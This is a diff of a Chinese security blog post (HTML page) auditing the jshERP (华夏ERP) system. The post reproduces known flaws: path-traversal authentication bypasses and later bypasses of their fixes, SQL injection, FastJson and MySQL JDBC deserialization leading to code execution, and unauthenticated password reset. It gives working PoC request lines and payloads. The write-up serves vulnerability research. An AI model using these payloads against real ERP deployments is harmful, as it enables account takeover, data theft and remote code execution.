@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>华夏ERP审计 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/12/01/%E5%8D%8E%E5%A4%8FERP%E5%AE%A1%E8%AE%A1/">
+<link rel="canonical" href="https://curlysean.github.io/2025/12/01/%E5%8D%8E%E5%A4%8FERP%E5%AE%A1%E8%AE%A1/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-12-01T07:04:38.000Z">2025.12.01</time></div>
-      <div><span>更新</span><time datetime="2025-12-01T07:04:38.000Z">2025.12.01</time></div>
-      <div><span>阅读</span><strong>17 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#zDSEy"><span class="toc-text">华夏ERP审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dpYQ2"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GwCXW"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iGhVI"><span class="toc-text">漏洞审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bUfBo"><span class="toc-text">鉴权绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oEIIa"><span class="toc-text">SpringBoot信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RY1eL"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wUU3f"><span class="toc-text">SQL注入1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sPNxz"><span class="toc-text">SQL注入2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TGmsH"><span class="toc-text">......</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TDbNR"><span class="toc-text">FastJson反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#YmHeS"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#QmPHD"><span class="toc-text">注入内存马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SloPz"><span class="toc-text">任意用户密码重置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#qt1EQ"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pst0J"><span class="toc-text">Poc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#KYzcQ"><span class="toc-text">华夏ERP鉴权修复绕过-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JGlTI"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdjUT"><span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#W7Vgk"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qAfc9"><span class="toc-text">华夏ERP鉴权修复绕过-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pkGDY"><span class="toc-text">华夏ERP后台jar包部署rce</span></a></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#dpYQ2"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GwCXW"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iGhVI"><span class="toc-text">漏洞审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bUfBo"><span class="toc-text">鉴权绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oEIIa"><span class="toc-text">SpringBoot信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RY1eL"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wUU3f"><span class="toc-text">SQL注入1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sPNxz"><span class="toc-text">SQL注入2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TGmsH"><span class="toc-text">......</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TDbNR"><span class="toc-text">FastJson反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#YmHeS"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#QmPHD"><span class="toc-text">注入内存马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SloPz"><span class="toc-text">任意用户密码重置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#qt1EQ"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pst0J"><span class="toc-text">Poc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#KYzcQ"><span class="toc-text">华夏ERP鉴权修复绕过-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JGlTI"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdjUT"><span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#W7Vgk"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qAfc9"><span class="toc-text">华夏ERP鉴权修复绕过-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pkGDY"><span class="toc-text">华夏ERP后台jar包部署rce</span></a></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-12-01T07:04:38.000Z">2025.12.01</time></div>
+        <div><span>更新</span><time datetime="2025-12-01T07:04:38.000Z">2025.12.01</time></div>
+        <div><span>阅读</span><strong>约 8 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="zDSEy">华夏ERP审计</h1>
+        
 闲来无事，来复现一下华夏ERP的历史漏洞，之前在知识星球中看到过这个系统的鉴权绕过的文章
 
 <p>感觉是很小的一套系统了，之前审计的代码有的太大了</p>
@@ -127,41 +148,41 @@ github链接：[https://github.com/jishenghua/jshERP](https://github.com/jisheng
 在这套系统中只有一个Filter，首先看一下这个初始函数，主要作用是初始化了`ignoredList`和`allowUrls`两个String数组，作为鉴权的白名单。
 
 <p>根据注解配置的初始化参数来看，对于<code>.css#.js#.jpg#.png#.gif#.ico</code>静态资源不会鉴权，<code>/user/login#/user/registerUser#/v2/api-docs</code>登录注册接口也不进行鉴权</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762839646502-ba89e2ab-a21d-46ea-b762-ce2df5b0823d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762839646502-ba89e2ab-a21d-46ea-b762-ce2df5b0823d.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>看到<code>doFilter</code>方法，很简单的逻辑，如果如果没有登录，且访问路径不为白名单，则会跳转到<code>/login.html</code>。其中除了上面说的两个白名单，还有如果<code>url</code>中包含<code>/doc.html</code>、<code>/register.html</code>和<code>/login.html</code>也会跳过鉴权</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762840086007-7b796c8d-710c-4737-8001-412a32155972.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762840086007-7b796c8d-710c-4737-8001-412a32155972.png" alt="华夏ERP审计" loading="lazy"></p>
 <p><code>verify</code>方法中也只是简单的匹配url中是否有关键字</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762874229295-21b88e79-beae-43ec-acf6-1d3fcfbc761e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762874229295-21b88e79-beae-43ec-acf6-1d3fcfbc761e.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>根据这个鉴权方式，并且在没有检测目录穿越的情况下我们很简单的就可以绕过鉴权</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/doc.html/..</span><br><span class="line">/register.html/..</span><br><span class="line">/login.html/..</span><br><span class="line">/.css/..</span><br><span class="line">/.js/..</span><br><span class="line">/user/login/../..</span><br><span class="line">/v2/api-docs/../..</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762874149981-135455a6-5f86-4f71-979d-1d35a8d670db.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762874149981-135455a6-5f86-4f71-979d-1d35a8d670db.png" alt="华夏ERP审计" loading="lazy"></p>
 <h3 id="oEIIa">SpringBoot信息泄露</h3>
 在分析Filter时，我们看到`/v2/api-docs`接口也是无需鉴权的
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762873650280-2ef38660-387e-4011-94ed-0865a4887630.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762873650280-2ef38660-387e-4011-94ed-0865a4887630.png" alt="华夏ERP审计" loading="lazy"></p>
 <h3 id="RY1eL">SQL注入</h3>
 首先先审计比较常见的漏洞SQL注入，这套系统使用Mybais进行与数据库进行交互，查询`${}`关键字
 
 <h4 id="wUU3f">SQL注入1</h4>
 在`selectByConditionUser`中，存在`userName`与`loginName`两个参数为拼接形式，可能存在SQL注入
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762870762305-d5cc9e27-5dc4-4c18-a201-ebcf740180e1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762870762305-d5cc9e27-5dc4-4c18-a201-ebcf740180e1.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>向上跟，跟到<code>getUserList</code>方法中，其中map中的键值对是从我们请求传参中提取出来的，代表<code>search</code>是可控的（路由部分自行分析一下）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762870873890-85d12d24-f6fd-4047-ab10-dbfcd3390df6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762870873890-85d12d24-f6fd-4047-ab10-dbfcd3390df6.png" alt="华夏ERP审计" loading="lazy"></p>
 <p><code>getInfo</code>方法做的就是将<code>search</code>进行反序列化，然后提取value值</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762870972270-f6718c0f-ea1c-453c-aaf9-ce120be8b917.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762870972270-f6718c0f-ea1c-453c-aaf9-ce120be8b917.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>向上会跟到<code>CommonQueryManager#select</code>方法中，根据调试发现，这里我们的<code>apiName</code>需要为user，才能走到我们目标<code>select</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762871269580-ac4ffc1e-dfac-4ca9-9c07-65c7f4c30399.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762871269580-ac4ffc1e-dfac-4ca9-9c07-65c7f4c30399.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>再向上走，就是<code>Controller</code>层了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762871317640-e92243ac-fdc7-4f0c-abde-799f75eac0cb.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762871317640-e92243ac-fdc7-4f0c-abde-799f75eac0cb.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>Poc如下</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/list?currentPage=1&amp;pageSize=1&amp;search=%7B%27userName%27%3A%27test%5C%27or%20sleep%281%29%20or%20%5C%271%5C%27%20like%5C%27%27%2C%27loginName%27%3A%27test%27%7D</span><br></pre></td></tr></table></figure>
 
 <h4 id="sPNxz">SQL注入2</h4>
 同理我们找到其他的注入点，`selectByConditionAccountHead`中的这几个参数也是存在sql注入的地方
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762873478539-e4d24e88-74e9-4629-b4bb-cc82ace8e6b5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762873478539-e4d24e88-74e9-4629-b4bb-cc82ace8e6b5.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>Poc如下</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/accountHead/list?currentPage=1&amp;pageSize=1&amp;search=%7B%22type%22%3A%22%22%2C%22roleType%22%3A%22%22%2C%22billNo%22%3A%22%22%2C%22beginTime%22%3A%22%22%2C%22endTime%22%3A%22%27or%20sleep%281%29%20or%20%271%27%3D%271%22%7D</span><br></pre></td></tr></table></figure>
 
@@ -176,33 +197,33 @@ github链接：[https://github.com/jishenghua/jshERP](https://github.com/jisheng
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/v2/api-docs/../../accountHead/list?currentPage=1&amp;pageSize=1&amp;search=%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22fast.b39395f530.ddns.1433.eu.org.%22%7D</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.10:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>可以成功接收到dns请求</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762875843927-dcb12feb-14f9-4e6f-8be7-b0d4d31ace45.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762875843927-dcb12feb-14f9-4e6f-8be7-b0d4d31ace45.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>FastJson的版本是<code>1.2.55</code>，常规的利用需要开启autoType，但是这并不是默认配置。之前我们还说，依赖中有<code>mysql-connect-java</code>依赖，可以使用<code>fastjson</code>来触发mysql-JDBC反序列化</p>
 <p>哈哈哈哈哈这里互相利用，用fastJson触发mysql JDBC反序列化</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762877594665-7a721c38-7918-4fb3-9abc-b1d2c134f599.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762877594665-7a721c38-7918-4fb3-9abc-b1d2c134f599.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>然后用用mysql JDBC反序列化去打fastjson的链子即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762877656546-b185ded3-6cd5-428e-b007-f69d3a5c5e0d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762877656546-b185ded3-6cd5-428e-b007-f69d3a5c5e0d.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>Poc如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /v2/api-docs/../../accountHead/list?currentPage=<span class="number">1</span>&amp;pageSize=<span class="number">1</span>&amp;search=%7B%22x1%<span class="number">22</span>%3A%7B%<span class="number">22</span>%40type%<span class="number">22</span>%3A%22java.lang.AutoCloseable%<span class="number">22</span>%2C%<span class="number">22</span>%40type%<span class="number">22</span>%3A%22com.mysql.jdbc.JDBC4Connection%<span class="number">22</span>%2C%22hostToConnectTo%<span class="number">22</span>%3A%<span class="number">22127.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">22</span>%2C%22portToConnectTo%<span class="number">22</span>%3A3308%2C%22info%<span class="number">22</span>%3A%7B%22user%<span class="number">22</span>%3A%22d85709f%<span class="number">22</span>%2C%22password%<span class="number">22</span>%3A%22pass%<span class="number">22</span>%2C%22statementInterceptors%<span class="number">22</span>%3A%22com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%<span class="number">22</span>%2C%22autoDeserialize%<span class="number">22</span>%3A%22true%<span class="number">22</span>%2C%22NUM_HOSTS%<span class="number">22</span>%3A%<span class="number">221</span>%<span class="number">22</span>%<span class="number">7D</span>%2C%22databaseToConnectTo%<span class="number">22</span>%3A%22test%<span class="number">22</span>%2C%22url%<span class="number">22</span>%3A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">7D</span>%<span class="number">7D</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span>:<span class="number">8080</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">142.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>成功弹出计算器<img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762877738303-abbcf378-bba6-4760-be32-44bd409d4612.png"></p>
+<p>成功弹出计算器<img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762877738303-abbcf378-bba6-4760-be32-44bd409d4612.png" alt="华夏ERP审计" loading="lazy"></p>
 <h4 id="QmPHD">注入内存马</h4>
 同理，修改Payload注入内存马即可
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762877983849-4d404ffb-a7b9-4236-aa3b-33e2e735ec8a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762877983849-4d404ffb-a7b9-4236-aa3b-33e2e735ec8a.png" alt="华夏ERP审计" loading="lazy"></p>
 <h3 id="SloPz">任意用户密码重置</h3>
 <h4 id="qt1EQ">分析</h4>
 在`UserController`中，存在`resetPwd`接口，接受用户id，就可以将对应id用户的密码重置为`123456`
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764073131255-e5240943-aa09-410f-9307-588ad044dfab.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764073131255-e5240943-aa09-410f-9307-588ad044dfab.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>用户id而可以通过<code>getUserList</code>接口获取id与对应id的用户信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764073311831-cc30301f-1478-4298-b2fa-d5fe2af38458.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764073311831-cc30301f-1478-4298-b2fa-d5fe2af38458.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>可以看到jsh用户的id为63</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764073096101-fff9677e-0d0d-44ef-94cf-a01ea5584762.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764073096101-fff9677e-0d0d-44ef-94cf-a01ea5584762.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>我们调用<code>/user/resetPwd</code>接口，来重置id为63的用户的密码为123456</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764073786514-dab5a904-6386-4c62-9806-e2c7a921a739.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764073786514-dab5a904-6386-4c62-9806-e2c7a921a739.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>本来想着想要重置admin的密码，但是开发者也是想到了这一点，禁止超管通过这个接口来重置admin的密码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764073855941-4307e861-2aba-4e42-bf43-b9d79b9edf72.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764073855941-4307e861-2aba-4e42-bf43-b9d79b9edf72.png" alt="华夏ERP审计" loading="lazy"></p>
 <h4 id="pst0J">Poc</h4>
 但是这两个接口都是后台接口，那么这里就可以配合之前的鉴权绕过漏洞，来达到前台任意用户密码修改的目的
 
@@ -214,15 +235,15 @@ github链接：[https://github.com/jishenghua/jshERP](https://github.com/jisheng
 <h3 id="JGlTI">修复</h3>
 看github上的commit，其中有一个修复任意用户密码重置的commit，修改了Filter的部分，当匹配到url中有`../`或`..;/`时，就会退出
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764000327500-24cfbf34-e404-4dc9-a89d-a7c0de13531d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764000327500-24cfbf34-e404-4dc9-a89d-a7c0de13531d.png" alt="华夏ERP审计" loading="lazy"></p>
 <h3 id="jdjUT">绕过</h3>
 这里的绕过很简单，他虽然匹配了`../`和`..;/`，但是并没有过滤url编码后的点`%2e`，因此很简单就可以绕过
 
 <p>看这里的<code>allowUrls</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764072243777-6b54694f-ce22-4dff-91bc-b079d609135e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764072243777-6b54694f-ce22-4dff-91bc-b079d609135e.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>如果<code>startsWith</code>以<code>allowUrls</code>开头的话，就会跳过鉴权</p>
 <p>Poc：<code>/jshERP-boot/v2/api-docs/%2e%2e/%2e%2e/user/getUserList</code>，可以看到成功绕过</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764072318522-1f407a62-334c-44c9-b769-27519a14db7c.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764072318522-1f407a62-334c-44c9-b769-27519a14db7c.png" alt="华夏ERP审计" loading="lazy"></p>
 <h3 id="W7Vgk">利用</h3>
 修复后，`/user/getAllList`接口就不存在了，但是还有一个接口为`/user/info`，根据id参数来获取对应用户的信息![](https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764079761759-2d0b56f4-e2d1-4ff6-b912-cc21dc3f7ea7.png)
 
@@ -230,25 +251,25 @@ github链接：[https://github.com/jishenghua/jshERP](https://github.com/jisheng
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jsh:<span class="number">63</span></span><br><span class="line">admin:<span class="number">120</span></span><br><span class="line">test:<span class="number">131</span></span><br></pre></td></tr></table></figure>
 
 <p>其中可以获取到password字段，但是是进行过加密的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764080131227-9081ae9f-9255-4df5-a3e9-0ad570d323e4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764080131227-9081ae9f-9255-4df5-a3e9-0ad570d323e4.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>我们可以通过两种方式进行来利用</p>
 <p>第一个是直接使用md5解密平台来进行解密</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764080203610-0ef8d122-f209-4252-b0ce-893f8a362003.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764080203610-0ef8d122-f209-4252-b0ce-893f8a362003.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>第二个是我们可以直接抓包进行利用，在登录时抓包我们可以发现，登录的时候传输的密码是已经进行过加密的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764080429258-4e49674f-19dd-433f-9688-3381a460c02d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764080429258-4e49674f-19dd-433f-9688-3381a460c02d.png" alt="华夏ERP审计" loading="lazy"></p>
 <h2 id="qAfc9">华夏ERP鉴权修复绕过-2</h2>
 开发者对于漏洞的修复思路大多数都是基于黑名单的修复，这次的拦截多了`%2E`的绕过
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764084906393-42a0d3b9-b5d6-47f2-b3d6-360cc194c623.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764084906393-42a0d3b9-b5d6-47f2-b3d6-360cc194c623.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>这里的绕过也很简单，他拦截了<code>..;/</code>但是我们在<code>;</code>后随便加点东西就可以绕过了 </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..;test/</span><br></pre></td></tr></table></figure>
 
 <p>但是我们原来获取用户密码的部分，被添加了限制，只有在登录状态下，才可以去获取用户信息，这个部分就被卡死了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764084170268-e43c7abc-1d1d-429e-8e04-302fb0bf0ad9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764084170268-e43c7abc-1d1d-429e-8e04-302fb0bf0ad9.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>我们看到部署jar包的部分，只有用户名为<code>admin</code>时，才可以成功部署jar包，那么我们是否可以创建一个名字为<code>admin</code>的用户呢</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764084261107-36f27a9e-86ca-45c2-b7bb-721ae206db58.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764084261107-36f27a9e-86ca-45c2-b7bb-721ae206db58.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>这里看到插入用户时，他的密码默认为123456，会接受一个json字符串，反序列化成<code>User</code>对象</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764084491972-bfd4259f-d33d-43fc-afd6-68689a502873.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764084491972-bfd4259f-d33d-43fc-afd6-68689a502873.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>只要当id不重复时，我们的<code>loginName</code>和<code>username</code>即便重复也无所谓</p>
